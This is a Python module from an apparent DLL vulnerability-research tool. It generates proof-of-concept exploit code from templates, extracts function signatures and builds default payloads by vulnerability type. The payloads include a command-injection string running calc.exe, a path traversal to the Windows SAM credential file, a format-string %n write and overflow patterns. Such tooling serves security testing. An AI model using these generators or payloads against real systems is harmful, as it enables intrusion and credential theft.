# -*- coding: utf-8 -*-
"""
luodllhack/exploit/generator.py - 上下文感知 PoC 生成器

根据约束条件生成精确的漏洞利用代码:
- 使用 Jinja2 模板引擎
- 支持所有漏洞类型
- 生成可运行的 Python/C 代码
"""

from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from pathlib import Path
from enum import Enum, auto
import logging
import struct

logger = logging.getLogger(__name__)

# 从统一类型定义导入 VulnType
from luodllhack.core.types import VulnType

# 导入模板引擎
from luodllhack.templates import get_engine, TemplateEngine
from .payload import PatternGenerator, BadCharFinder

# 导入签名提取器 (从统一签名模块)
try:
    from luodllhack.core.signatures import (
        SignatureExtractor,
        FunctionSignature,
        DisasmAnalyzer,
        get_enhanced_signature,
    )
    HAVE_SIGNATURE_EXTRACTOR = SignatureExtractor.is_available()
    HAVE_DISASM_ANALYZER = True
except ImportError:
    HAVE_SIGNATURE_EXTRACTOR = False
    HAVE_DISASM_ANALYZER = False
    SignatureExtractor = None
    FunctionSignature = None
    DisasmAnalyzer = None
    get_enhanced_signature = None


class PoCLanguage(Enum):
    """PoC 语言"""
    PYTHON = auto()
    C = auto()
    POWERSHELL = auto()


@dataclass
class PoCResult:
    """PoC 生成结果"""
    vuln_type: VulnType
    target_address: int
    func_name: str
    dll_name: str
    language: PoCLanguage
    code: str
    payload: bytes
    description: str
    success_probability: float = 0.5
    notes: List[str] = field(default_factory=list)
    pattern_offset: Optional[int] = None  # EIP控制的精确偏移

    def to_dict(self) -> Dict:
        result = {
            'vuln_type': self.vuln_type.name,
            'target': f'0x{self.target_address:x}',
            'func_name': self.func_name,
            'dll_name': self.dll_name,
            'language': self.language.name,
            'code_length': len(self.code),
            'payload_hex': self.payload.hex()[:100] + '...' if len(self.payload) > 50 else self.payload.hex(),
            'success_probability': self.success_probability,
            'notes': self.notes
        }

        if self.pattern_offset is not None:
            result['pattern_offset'] = self.pattern_offset

        return result


@dataclass
class ExploitContext:
    """漏洞利用上下文"""
    dll_path: str
    func_name: str
    func_addr: int
    vuln_type: VulnType
    sink_api: str
    tainted_args: List[int]

    # 从符号执行获取的信息
    solved_inputs: Dict[str, bytes] = field(default_factory=dict)
    constraints_count: int = 0

    # 从污点分析获取的信息
    taint_path: List[int] = field(default_factory=list)
    confidence: float = 0.5

    # 漏洞特定信息
    buffer_size: Optional[int] = None
    target_offset: Optional[int] = None
    format_offset: Optional[int] = None

    # 调用配置
    arg_count: Optional[int] = None
    custom_call_args: Optional[str] = None
    brute_force_args: bool = False

    # [P2] 函数签名信息 (从 SignatureExtractor 获取)
    calling_convention: Optional[str] = None  # "cdecl", "stdcall", "fastcall", "win64"
    args_info: List[Dict[str, Any]] = field(default_factory=list)  # [{index, location, size, type_hint, is_pointer}]
    return_type: str = "unknown"  # "void", "int", "ptr", "bool"
    ctypes_argtypes: Optional[str] = None  # "[ctypes.c_uint64, ctypes.c_void_p]"
    ctypes_restype: Optional[str] = None   # "ctypes.c_void_p"

    # COM 方法标记
    is_com_method: bool = False  # 是否为 COM 接口方法
    has_this_pointer: bool = False  # 是否有隐含的 this 指针

    # PoC 生成配置
    auto_trigger: bool = True  # True = 生成可直接运行的代码
    safe_mode: bool = False    # True = 注释掉危险调用

    # 新增: 坏字符检测配置
    detect_bad_chars: bool = False
    bad_char_test_range: Optional[range] = None
    speakeasy_timeout: int = 60

    # 外部签名文件
    signature_file: Optional[str] = None


class PrecisePoCGenerator:
    """
    精确的 PoC 生成器 (模板驱动版本)

    基于 Jinja2 模板引擎生成针对性的漏洞利用代码

    用法:
        generator = PrecisePoCGenerator()

        context = ExploitContext(
            dll_path="target.dll",
            func_name="VulnFunc",
            func_addr=0x10001000,
            vuln_type=VulnType.BUFFER_OVERFLOW,
            sink_api="strcpy",
            tainted_args=[0],
            solved_inputs={'arg0': b'A' * 100},
            buffer_size=64
        )

        poc = generator.generate(context)
        print(poc.code)
    """

    # 漏洞类型到模板名的映射
    TEMPLATE_MAP: Dict[VulnType, str] = {
        VulnType.BUFFER_OVERFLOW: 'poc/buffer_overflow.py.j2',
        VulnType.FORMAT_STRING: 'poc/format_string.py.j2',
        VulnType.COMMAND_INJECTION: 'poc/command_injection.py.j2',
        VulnType.INTEGER_OVERFLOW: 'poc/integer_overflow.py.j2',
        VulnType.DOUBLE_FREE: 'poc/double_free.py.j2',
        VulnType.USE_AFTER_FREE: 'poc/use_after_free.py.j2',
        VulnType.PATH_TRAVERSAL: 'poc/path_traversal.py.j2',
        VulnType.NULL_DEREFERENCE: 'poc/null_dereference.py.j2',
        VulnType.HEAP_OVERFLOW: 'poc/heap_overflow.py.j2',
        VulnType.OUT_OF_BOUNDS_READ: 'poc/oob_access.py.j2',
        VulnType.OUT_OF_BOUNDS_WRITE: 'poc/oob_access.py.j2',
        VulnType.INTEGER_UNDERFLOW: 'poc/integer_underflow.py.j2',
        VulnType.UNINITIALIZED_MEMORY: 'poc/uninitialized_memory.py.j2',
        VulnType.TYPE_CONFUSION: 'poc/type_confusion.py.j2',
        VulnType.CONTROL_FLOW_HIJACK: 'poc/control_flow_hijack.py.j2',
        VulnType.INFO_DISCLOSURE: 'poc/info_disclosure.py.j2',
        VulnType.UNTRUSTED_POINTER_DEREFERENCE: 'poc/untrusted_pointer_dereference.py.j2',
        # 复杂类型使用通用模板
        VulnType.RACE_CONDITION: 'poc/generic.py.j2',
        VulnType.MEMORY_LEAK: 'poc/generic.py.j2',
        VulnType.STACK_EXHAUSTION: 'poc/generic.py.j2',
        VulnType.DESERIALIZATION: 'poc/generic.py.j2',
        VulnType.PRIVILEGE_ESCALATION: 'poc/generic.py.j2',
    }

    def __init__(self, engine: TemplateEngine = None, auto_extract_signature: bool = True):
        """
        初始化 PoC 生成器

        Args:
            engine: 可选的自定义模板引擎实例
            auto_extract_signature: 是否自动提取函数签名 (默认 True)
        """
        self.engine = engine or get_engine()
        self.auto_extract_signature = auto_extract_signature
        self._signature_extractors: Dict[str, 'SignatureExtractor'] = {}

    def _get_signature_extractor(self, dll_path: str) -> Optional['SignatureExtractor']:
        """获取或创建 DLL 的签名提取器 (带缓存)"""
        if not HAVE_SIGNATURE_EXTRACTOR:
            return None

        if dll_path not in self._signature_extractors:
            try:
                self._signature_extractors[dll_path] = SignatureExtractor(
                    Path(dll_path), use_angr=False, cache=True
                )
            except Exception as e:
                logger.warning(f"Failed to create SignatureExtractor for {dll_path}: {e}")
                return None

        return self._signature_extractors[dll_path]

    def _extract_and_apply_signature(self, context: ExploitContext) -> None:
        """
        自动提取函数签名并应用到上下文

        使用增强的反汇编分析来提取准确的签名信息，包括:
        - COM 接口方法识别
        - 指针参数检测 (通过解引用模式)
        - 输出参数检测
        """
        # 如果已经有签名信息，跳过
        if context.ctypes_argtypes or context.calling_convention:
            return

        sig = None

        # 优先使用增强的反汇编分析 (传递外部签名文件)
        if HAVE_DISASM_ANALYZER and get_enhanced_signature:
            try:
                sig = get_enhanced_signature(
                    Path(context.dll_path),
                    context.func_name,
                    rva=context.func_addr or 0,
                    signature_file=context.signature_file
                )
                if sig:
                    # 统计指针参数数量 (兼容 ArgInfo 对象和字典)
                    ptr_count = sum(1 for a in sig.args
                                   if (getattr(a, 'is_pointer', False) if hasattr(a, 'is_pointer')
                                       else a.get('is_pointer', False)))
                    logger.info(f"Enhanced signature for {context.func_name}: "
                               f"args={sig.arg_count}, is_com={sig.is_com_method}, "
                               f"ptr_args={ptr_count}")
            except Exception as e:
                logger.debug(f"Enhanced analysis failed, falling back: {e}")

        # 回退到基础提取器
        if not sig:
            extractor = self._get_signature_extractor(context.dll_path)
            if extractor:
                try:
                    sig = extractor.get_signature(context.func_name)
                except Exception as e:
                    logger.warning(f"Failed to extract signature for {context.func_name}: {e}")

        if sig:
            context.calling_convention = sig.calling_convention
            # 转换 ArgInfo 对象为字典 (模板需要字典格式)
            context.args_info = [
                (a.to_dict() if hasattr(a, 'to_dict') else a) for a in sig.args
            ]
            context.return_type = sig.return_type
            # 使用字符串版本，模板需要可执行的 Python 代码
            context.ctypes_argtypes = sig.get_ctypes_argtypes_str()
            context.ctypes_restype = sig.get_ctypes_restype_str()

            # 添加 COM 方法标记
            context.is_com_method = getattr(sig, 'is_com_method', False)
            context.has_this_pointer = getattr(sig, 'has_this_pointer', False)

            # 如果没有指定 arg_count，使用签名中的
            if context.arg_count is None:
                context.arg_count = sig.arg_count

            # 如果 func_addr 为 0，使用 RVA (注意：这不是绝对地址)
            if context.func_addr == 0 and sig.rva > 0:
                context.func_addr = sig.rva

            logger.info(f"Applied signature for {context.func_name}: "
                       f"args={sig.arg_count}, cc={sig.calling_convention}, "
                       f"is_com={context.is_com_method}, "
                       f"argtypes={context.ctypes_argtypes}")

    def generate(self, context: ExploitContext,
                 language: PoCLanguage = PoCLanguage.PYTHON) -> PoCResult:
        """
        生成 PoC

        Args:
            context: 漏洞利用上下文
            language: 目标语言

        Returns:
            PoCResult
        """
        # 自动提取函数签名
        if self.auto_extract_signature:
            self._extract_and_apply_signature(context)

        # 获取对应模板
        template_name = self.TEMPLATE_MAP.get(context.vuln_type, 'poc/generic.py.j2')

        # 构建模板上下文
        template_context = self._build_template_context(context)

        # 渲染模板
        try:
            code = self.engine.render(template_name, template_context)
        except Exception as e:
            logger.error(f"Template render failed: {e}")
            # 回退到通用模板
            code = self.engine.render('poc/generic.py.j2', template_context)

        # 构建 payload
        payload = self._build_payload(context)

        # 如果是缓冲区溢出且未指定偏移，尝试计算偏移
        pattern_offset = None
        if context.vuln_type == VulnType.BUFFER_OVERFLOW and context.target_offset is None:
            # 如果使用了模式生成，我们可以尝试从返回地址中计算偏移
            # 这里我们简单地返回整个模式的长度，实际使用中需要在溢出后检查EIP
            pattern_offset = len(payload)

        # 执行坏字符检测（如果启用）
        bad_char_result = None
        if context.detect_bad_chars:
            try:
                finder = BadCharFinder()
                bad_char_result = finder.detect(
                    context.func_addr,
                    context.dll_path,
                    context.bad_char_test_range,
                    context.speakeasy_timeout
                )
            except Exception as e:
                logger.warning(f"Bad character detection failed: {e}")

        # 构建描述和备注
        description = self._build_description(context)
        notes = self._build_notes(context)

        # 添加坏字符检测结果到备注
        if bad_char_result and bad_char_result.success:
            notes.append(f"Bad chars detected: {len(bad_char_result.detected_bad_chars)}")
            notes.append(f"Safe chars: {len(bad_char_result.safe_chars)}")
            if bad_char_result.detected_bad_chars:
                notes.append(f"Bad chars (first 10): {[hex(c) for c in bad_char_result.detected_bad_chars[:10]]}")

        return PoCResult(
            vuln_type=context.vuln_type,
            target_address=context.func_addr,
            func_name=context.func_name,
            dll_name=Path(context.dll_path).name,
            language=language,
            code=code,
            payload=payload,
            description=description,
            success_probability=context.confidence,
            notes=notes,
            pattern_offset=pattern_offset
        )

    def _build_template_context(self, ctx: ExploitContext) -> Dict[str, Any]:
        """构建模板渲染上下文"""
        # 计算派生值
        buffer_size = ctx.buffer_size or 256
        target_offset = ctx.target_offset or buffer_size + 8
        format_offset = ctx.format_offset or 6

        # 生成调用参数
        call_args = self._generate_call_args(ctx)

        return {
            # 基本信息
            'dll_path': ctx.dll_path,
            'dll_name': Path(ctx.dll_path).name,
            'func_name': ctx.func_name,
            'func_addr': ctx.func_addr,
            'sink_api': ctx.sink_api,
            'vuln_type': ctx.vuln_type.name if hasattr(ctx.vuln_type, 'name') else str(ctx.vuln_type),

            # 漏洞特定参数
            'buffer_size': buffer_size,
            'target_offset': target_offset,
            'format_offset': format_offset,
            'payload_size': buffer_size + 32,

            # 调用配置
            'arg_count': ctx.arg_count,
            'tainted_args': ctx.tainted_args,
            'call_args': call_args,
            'brute_force_args': ctx.brute_force_args,
            'safe_mode': ctx.safe_mode,

            # [P2] 函数签名信息
            'calling_convention': ctx.calling_convention,
            'args_info': ctx.args_info,
            'return_type': ctx.return_type,
            'ctypes_argtypes': ctx.ctypes_argtypes,
            'ctypes_restype': ctx.ctypes_restype,
            'has_signature': bool(ctx.calling_convention or ctx.ctypes_argtypes),

            # 符号执行结果
            'solved_inputs': ctx.solved_inputs,
            'has_solved_inputs': bool(ctx.solved_inputs),

            # 置信度
            'confidence': ctx.confidence,
        }

    def _generate_call_args(self, ctx: ExploitContext) -> str:
        """生成函数调用参数字符串"""
        if ctx.custom_call_args:
            return ctx.custom_call_args

        if ctx.arg_count and ctx.arg_count > 1:
            # 根据 tainted_args 确定 payload 位置
            args = ['0'] * ctx.arg_count
            if ctx.tainted_args:
                for idx in ctx.tainted_args:
                    if 0 <= idx < ctx.arg_count:
                        args[idx] = 'payload'
                        break
            else:
                args[-1] = 'payload'
            return ', '.join(args)

        return 'payload'

    def _build_payload(self, ctx: ExploitContext) -> bytes:
        """根据漏洞类型构建默认 payload"""
        vuln_type = ctx.vuln_type

        if vuln_type == VulnType.BUFFER_OVERFLOW:
            buffer_size = ctx.buffer_size or 256
            target_offset = ctx.target_offset or buffer_size + 8

            # 如果需要精确定位偏移，使用模式生成器
            if ctx.target_offset is None:  # 如果没有指定偏移，生成模式用于定位
                total_size = buffer_size + 32  # 额外空间用于定位
                payload = PatternGenerator.create(total_size)
            else:
                payload = b'A' * buffer_size
                if target_offset > buffer_size:
                    payload += b'B' * (target_offset - buffer_size)
                payload += b'CCCCCCCC'
            return payload

        elif vuln_type == VulnType.HEAP_OVERFLOW:
            buffer_size = ctx.buffer_size or 128
            return b'A' * buffer_size + b'B' * 64

        elif vuln_type == VulnType.FORMAT_STRING:
            offset = ctx.format_offset or 6
            return f'%{offset}$x.%{offset}$x.%{offset}$x.%{offset}$n'.encode()

        elif vuln_type == VulnType.COMMAND_INJECTION:
            return b'; calc.exe'

        elif vuln_type == VulnType.INTEGER_OVERFLOW:
            return struct.pack('<I', 0x7FFFFFFF)

        elif vuln_type == VulnType.INTEGER_UNDERFLOW:
            return struct.pack('<i', -1)

        elif vuln_type == VulnType.PATH_TRAVERSAL:
            return b'..\\..\\..\\..\\windows\\system32\\config\\sam'

        elif vuln_type == VulnType.NULL_DEREFERENCE:
            return b'\x00' * 8

        elif vuln_type == VulnType.CONTROL_FLOW_HIJACK:
            return b'A' * 64 + struct.pack('<Q', 0x4141414141414141)

        elif vuln_type in (VulnType.DOUBLE_FREE, VulnType.USE_AFTER_FREE,
                           VulnType.TYPE_CONFUSION, VulnType.UNINITIALIZED_MEMORY,
                           VulnType.INFO_DISCLOSURE):
            # 返回一个字节的占位符，以确保 _save_outputs 不会跳过它
            return b'\x00'

        elif vuln_type in (VulnType.OUT_OF_BOUNDS_READ, VulnType.OUT_OF_BOUNDS_WRITE):
            return struct.pack('<I', 0xFFFFFFFF)

        # 使用求解的输入 (如果有)
        if ctx.solved_inputs:
            for name, value in ctx.solved_inputs.items():
                if value:
                    return value

        # 默认 payload
        return b'A' * 256

    def _build_description(self, ctx: ExploitContext) -> str:
        """构建漏洞描述"""
        vuln_name = ctx.vuln_type.name if hasattr(ctx.vuln_type, 'name') else str(ctx.vuln_type)
        vuln_name = vuln_name.replace('_', ' ').title()

        desc = f"{vuln_name} in {ctx.sink_api}()"

        if ctx.buffer_size and ctx.vuln_type in (VulnType.BUFFER_OVERFLOW, VulnType.HEAP_OVERFLOW):
            desc += f" - {ctx.buffer_size} byte buffer"

        return desc

    def _build_notes(self, ctx: ExploitContext) -> List[str]:
        """构建备注列表"""
        notes = []
        vuln_type = ctx.vuln_type

        # 通用备注
        if ctx.tainted_args:
            notes.append(f"Tainted args: {ctx.tainted_args}")
        notes.append(f"Sink API: {ctx.sink_api}")

        # 类型特定备注
        if vuln_type == VulnType.BUFFER_OVERFLOW:
            notes.append(f"Buffer size: {ctx.buffer_size or 256} bytes")
            notes.append(f"Target offset: {ctx.target_offset or (ctx.buffer_size or 256) + 8} bytes")

        elif vuln_type == VulnType.FORMAT_STRING:
            notes.append(f"Stack offset: {ctx.format_offset or 6}")
            notes.append("Use %n to write, %x to read")

        elif vuln_type == VulnType.DOUBLE_FREE:
            notes.append("Requires specific call sequence")
            notes.append("May be exploitable for code execution")

        elif vuln_type == VulnType.USE_AFTER_FREE:
            notes.append("Requires heap spray or precise timing")

        elif vuln_type == VulnType.CONTROL_FLOW_HIJACK:
            notes.append("Indirect call target controlled by attacker")
            notes.append("May allow RCE")

        elif vuln_type == VulnType.INTEGER_OVERFLOW:
            notes.append("Test boundary values around INT_MAX/UINT_MAX")

        elif vuln_type in (VulnType.OUT_OF_BOUNDS_READ, VulnType.OUT_OF_BOUNDS_WRITE):
            notes.append("Test with large/negative indices")

        return notes

    def generate_batch(self, contexts: List[ExploitContext],
                       language: PoCLanguage = PoCLanguage.PYTHON) -> List[PoCResult]:
        """
        批量生成 PoC

        Args:
            contexts: 漏洞上下文列表
            language: 目标语言

        Returns:
            PoCResult 列表
        """
        results = []
        for ctx in contexts:
            try:
                result = self.generate(ctx, language)
                results.append(result)
            except Exception as e:
                logger.error(f"Failed to generate PoC for {ctx.func_name}: {e}")
        return results
